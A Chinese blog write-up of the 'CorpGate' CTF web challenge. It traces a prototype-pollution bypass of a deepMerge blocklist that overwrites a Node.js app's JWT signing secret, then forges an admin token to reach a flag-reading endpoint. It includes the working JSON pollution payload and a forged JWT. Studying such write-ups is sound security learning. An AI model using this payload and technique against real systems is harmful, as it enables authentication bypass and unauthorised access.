            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p><strong>题目：WEB-2026DASCTF夏季赛-CorpGate</strong></p>
<p>前置知识：有关于js原型链的基础知识可以看看这篇文章：<a href="https://www.cnblogs.com/sabliercoder/articles/19174635" target="_blank">https://www.cnblogs.com/sabliercoder/articles/19174635</a></p>
<p>，jwt默认了解，下文如有错误，欢迎指出</p>
<h3 id="一题目描述">一、题目描述：</h3>
<p>一套全新的企业员工门户系统CorpGat</p>
<h3 id="二这里给了个源码附件我们先进行源码审计">二、这里给了个源码附件，我们先进行源码审计：</h3>
<p>【1】首先看jwt.js文件</p>
<pre><code>function signToken(payload) {
  return jwt.sign(payload, config.signingState.active, {
    algorithm: config.jwtConfig.algorithm,
    expiresIn: config.jwtConfig.expiresIn
  });
}
</code></pre>
<p>很容易知道<code>config.signingState.active</code>就是jwt加密密钥，因为他这里<code>const jwt = require('jsonwebtoken');</code>引入了nodejs中专门用来处理jwt的库，后面的<strong>jwt.sign</strong>函数</p>
<p>的参数二就是jwt签名密钥，见下图，它<code>module.exports = { signToken };</code>把将这个函数暴露出去，供其他文件调用，而在auth.js文件的44行他也确实调用了用来签名加密</p>
<p><img alt="image-20260530131142469" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3801164/202605/3801164-20260531123118327-1376463796.png" class="lazyload"></p>
<p><img alt="image-20260531120622598" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3801164/202605/3801164-20260531123205293-466251430.png" class="lazyload"></p>
<p>【2】在配置文件里面查找signingState.active，定位到config.js文件</p>
<pre><code>const signingState = Object.create(null);
signingState.active = jwtConfig.secret;
signingState.version = 1;
signingState.lastRotation = Date.now();
</code></pre>
<p>这里把<code>signingState.active</code>赋值给了<code>jwtConfig.secret</code>，这不是重点</p>
<p>接下来是重点：</p>
<pre><code class="language-javascript">function configRefresh() {
  var rotation = {};
  rotation.source = 'vault';
  rotation.timestamp = Date.now();

  if (rotation.pending) {
    signingState.active = rotation.pending;
    signingState.version++;
    signingState.lastRotation = Date.now();
    return { rotated: true, version: signingState.version };
  }
  return { rotated: false, version: signingState.version };
}
</code></pre>
<p>（1）这里的rotation被赋值为一个对象<code>{}</code>，并且<code>signingState.active = rotation.pending;</code>即它具有一个属性<code>pending</code>，很容易联想到如果rotation没有这个属性，就会通过<code>__proto__</code>访问它的原型对象，看看有无<code>pending</code>属性，若有，则直接应用，而<code>rotation={}</code>，它的上级对象即<code>object.protyte</code>，这一点在浏览器console中可以简单验证，目前思路就是污染原型链，让<code>rotation.pending</code>为我们自己写的密钥，然后我们通过自己伪造的密钥来修改jwt的role为admin，从而访问受限的/admin路由</p>
<p><img alt="image-20260530132003568" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3801164/202605/3801164-20260531123235522-2145616156.png" class="lazyload"></p>
<p>（2）这里我的思路是先全局查找configRefresh()和pending，看看有没有什么线索，结果没有，于是随便翻翻，查找文件目录，发现了<code>merge.js</code>，看到文件名，应该就是for循环加merge合并污染了，但下面做了过滤，我们接下来就要绕过过滤</p>
<pre><code class="language-javascript">const BLOCKED_ROOTS = ['__proto__', '__defineGetter__', '__defineSetter__', 'constructor', 'prototype'];
const BLOCKED_KEYS = ['__proto__', '__defineGetter__', '__defineSetter__'];
const MAX_DEPTH = 6;

function isPlainObject(val) {
  return typeof val === 'object' &amp;&amp; val !== null &amp;&amp; !Array.isArray(val);
}

function sanitizeKey(key) {   #去点号
  return key.replace(/\./g, '');
}

function deepMerge(target, source, depth) {
  if (depth === undefined) depth = 0;
  if (depth &gt;= MAX_DEPTH) return target;
  for (var rawKey in source) {
    var key = sanitizeKey(rawKey); 
    if (key === '') continue;   #空key跳过
    if (BLOCKED_KEYS.indexOf(key) !== -1) continue;
    if (depth &lt; 3 &amp;&amp; BLOCKED_ROOTS.indexOf(key) !== -1) continue;
    if (isPlainObject(source[rawKey])) {
      if (typeof target[key] === 'object' &amp;&amp; target[key] !== null) {
        deepMerge(target[key], source[rawKey], depth + 1);
      } else if (typeof target[key] === 'function') {
        deepMerge(target[key], source[rawKey], depth + 1);
      }
    } else {
      target[key] = source[rawKey];
    }
  }
  return target;
}

module.exports = { deepMerge };
</code></pre>
<p>关键代码有两处：</p>
<pre><code class="language-javascript">const BLOCKED_ROOTS = ['__proto__', '__defineGetter__', '__defineSetter__', 'constructor', 'prototype'];
const BLOCKED_KEYS = ['__proto__', '__defineGetter__', '__defineSetter__'];

##BLOCKED_ROOTS过滤了5个，BLOCKED_KEYS过滤了3个，他们的差异就是constructor和prototype
</code></pre>
<pre><code class="language-javascript">    if (BLOCKED_KEYS.indexOf(key) !== -1) continue;
    if (depth &lt; 3 &amp;&amp; BLOCKED_ROOTS.indexOf(key) !== -1) continue;
</code></pre>
<p>解析：</p>
<p>【1】index0f()方法用来过滤BLOCKED_ROOTS以及BLOCKED_KEYS的，起到一个黑名单的作用，即不在黑名单里的就返回-1，也就是不在黑名单的不会执行continue重新进入for循环，会进行后面的merge合并，导致js原型链污染</p>
<p><img alt="image-20260530133721158" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3801164/202605/3801164-20260531123322029-24657129.png" class="lazyload"></p>
<p>【2】<strong><code>typeof</code> 操作符</strong>：这个操作符会返回一个字符串，表示其操作数的类型</p>
<p>（1）而typeof {}返回的是object，typeof {'sb':11}也返回object，即当前属性值是要是一个对象</p>
<p>（2）对于函数而言</p>
<pre><code>console.log(typeof function(){}); // 返回function
</code></pre>
<h3 id="绕过方法这里其实要结合">绕过方法：这里其实要结合</h3>
<p>这里的key是我们后面要污染pending属性用的payload，这里直接拿出来讲解一下:</p>
<pre><code class="language-javascript">{
  "notifications": {
    "digest": {
      "channels": {
        "constructor": {
          "prototype": {
            "pending": "sb"
          }
        }
      }
    }
  }
}
</code></pre>
<p>(1)对于<code>if (BLOCKED_KEYS.indexOf(key) !== -1) continue;</code></p>
<p>这是绕不了的，如果 key 是 <code>__proto__ 、 __defineGetter__ 、 __defineSetter__ </code>之一，直接跳过，也就是不会执行后面的deepmarge函数，导致我们的污染失败</p>
<pre><code class="language-javascript">  if (typeof target[key] === 'object' &amp;&amp; target[key] !== null) {
        deepMerge(target[key], source[rawKey], depth + 1);
</code></pre>
<p>(2)对于</p>
<pre><code class="language-javascript">if (depth &lt; 3 &amp;&amp; BLOCKED_ROOTS.indexOf(key) !== -1) continue;
</code></pre>
<p>只有满足两个条件才会拦截，即depth 小于 3，并且 key 在 BLOCKED_ROOTS 中，才跳过</p>
<p>总结：<code>__proto__</code>永远用不了，但 constructor 和 prototype 在 depth ≥ 3 时可以绕过, 这就是为什么我们要把 payload 嵌套到 notifications.digest.channels (因为后面的服务端他自己的settiings刚好有这个，三层嵌套让我们来绕过)里面——为了凑够 depth=3</p>
<h4 id="经代码审计后面有deepmergeusersettings-reqbody即target是usersettings即服务器默认用户配置具体解析见下面的实际流程">经代码审计后面有deepMerge(user.settings, req.body);，即target是user.settings（即服务器默认用户配置）,具体解析见下面的实际流程</h4>
<p>（3）实际流程：</p>
<p><strong>deepMerge(target, source, depth)</strong></p>
<pre><code class="language-javascript">deepMerge(settings, payload, depth=0)
##先遍历我们payload的key
  key="notifications" → settings.notifications 存在且是对象 → 递归
  
  deepMerge(settings.notifications, payload.notifications, depth=1)
    key="digest" → settings.notifications.digest 存在且是对象 → 递归
    
    deepMerge(settings.notifications.digest, payload.digest, depth=2)
      key="channels" → settings.notifications.digest.channels 存在且是对象 → 递归
      
      deepMerge(settings.channels, payload.channels, depth=3)  ← depth=3
      
        key="constructor" → depth≥3，绕过BLOCKED_ROOTS！
        → target["constructor"] = Object(函数) → typeof === 'function' → 递归
        
        deepMerge(Object, {prototype:{pending:"sb"}}, depth=4)
          key="prototype" → depth≥3，绕过BLOCKED_ROOTS！
          → Object.prototype 是对象 → 递归
          
          deepMerge(Object.prototype, {pending:"sb"}, depth=5)
            key="pending" → 不是对象 → 直接赋值
            → Object.prototype.pending = "sb"
于是就污染成功了
</code></pre>
<p>【2】对于deepmerge函数，全局搜索看看，在/api/settings路由下面，这里也是我们等下要通过这个api接口发包用来污染object.prototyte的<br>
<img alt="image-20260530133046128" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3801164/202605/3801164-20260531123350622-2074636535.png" class="lazyload"></p>
<pre><code>deepMerge(user.settings, req.body);

## user.settings （当前默认的设置对象）
req.body （我们POST 过来的 JSON 数据)
</code></pre>
<p>结合前面的，deepmerge用来合并res.body到setting中的（即我们的目的是合并没有的属性pending给所有对象的最终对象object.prototype，因为所有对象最终都继承于它）</p>
<p>【3】接下来去请求/api/settings路由</p>
<pre><code>deepMerge(user.settings, req.body);
  res.json({ success: true, message: 'Settings updated', settings: user.settings })
</code></pre>
<p><img alt="image-20260530140556052" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3801164/202605/3801164-20260531123426137-2123936539.png" class="lazyload"></p>
<p>user.settings 的结构是：</p>
<pre><code class="language-javascript">{
"theme":"light",
"language":"en",
	"notifications":
{
"email":true,
"desktop":true,
	"digest":
{
"frequency":"daily",
"time":"09:00",
	"channels":
{
"slack":true,
"teams":false}
}
}
}
</code></pre>
<p>可以看到刚好嵌套了3层，notifications到digest到digest，刚好满足绕过条件</p>
<p>所以payload:</p>
<pre><code class="language-javascript">{
  "notifications": {
    "digest": {
      "channels": {
        "constructor": {
          "prototype": {
            "pending": "sb"
          }
        }
      }
    }
  }
}
</code></pre>
<p><img alt="2c733a0d-44bf-47cf-84aa-d6725ced86af" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3801164/202605/3801164-20260531122727796-1514074711.png" class="lazyload"></p>
<p>可以看到污染成功，所有对象都继承了object.prototype的pending属性</p>
<p>【4】接下来要触发 /api/system/healthcheck ， configRefresh() 中的 signingState.active = rotation.pending 就会从原型链读到 pending = "sb" ，把签名密钥改成 "sb" ，然后你就可以用 "sb" 伪造 admin JWT从而访问/admin路由</p>
<p>在config.js文件下：</p>
<pre><code class="language-javascript">function configRefresh() {
  var rotation = {};
  rotation.source = 'vault';
  rotation.timestamp = Date.now();

  if (rotation.pending) {
    signingState.active = rotation.pending; 
      
      #当rotation.pending不为空，用来更新密钥，等下就可以用我们的密钥sb来签名了
    
      signingState.version++;
    signingState.lastRotation = Date.now();
    return { rotated: true, version: signingState.version };
  }
  return { rotated: false, version: signingState.version };
}
</code></pre>
<p>全文搜索 configRefresh，再次定位到user.js文件中</p>
<p><img alt="image-20260530141556854" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3801164/202605/3801164-20260531123500665-1719398532.png" class="lazyload"></p>
<p>定位到user.js文件，访问/api/system/healthcheck才可以触发configRefresh函数从而触发密钥更换，这也是非常坑</p>
<p><img alt="cd41306985b747d402060a8b06dec53f" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3801164/202605/3801164-20260531123508436-535094230.png" class="lazyload"></p>
<p>注：jwt密钥替换用sb签名</p>
<p><img alt="image-20260530142803937" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3801164/202605/3801164-20260531123521233-1692409029.png" class="lazyload"></p>
<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjVjZTNjNjhkLTgyNzYtNDU4YS05ZjE1LTgyZmIwZWJlMTQ0YiIsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3ODAxMTE0MzIsImV4cCI6MTc4MDE5NzgzMn0.zDFl2-ljmIlTaNYouJXh2jI5ipNNEFpqJ5N0jepDrAI
</code></pre>
<p>【5】接下来访问/admin ，服务器生成一个 reference</p>
<p><img alt="image-20260530143006461" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3801164/202605/3801164-20260531123537177-532854926.png" class="lazyload"></p>
<pre><code>05f678cea169cb24076d00cc1e51fd3f
</code></pre>
<p>在diagnostic.js文件里面：</p>
<pre><code class="language-javascript">router.post('/api/reports/execute', authMiddleware, adminMiddleware, (req, res) =&gt; {
  var ref = req.body.reference;
  if (!ref || typeof ref !== 'string') {
    return res.status(400).json({ error: 'Missing report reference' });
  }

  var entry = config.diagnosticStore[ref];
  if (!entry) {
    return res.status(404).json({ error: 'Invalid or expired reference' });
  }

  // Check TTL
  if (Date.now() - entry.created &gt; entry.ttl) {
    delete config.diagnosticStore[ref];
    return res.status(410).json({ error: 'Reference expired' });
  }

  // Check one-time use
  if (entry.consumed) {
    return res.status(409).json({ error: 'Reference already consumed' });
  }

  entry.consumed = true;

  var output = 'Diagnostic failed';
  try {
    output = execSync('/readflag').toString().trim();
  } catch (e) {}

  res.json({ status: 'completed', report: output });
});
</code></pre>
<p>（1）  var ref = req.body.reference;</p>
<p>我们通过访问/api/reports/execute，body传参reference来触发execSync('/readflag').toString().trim();执行获得flag</p>
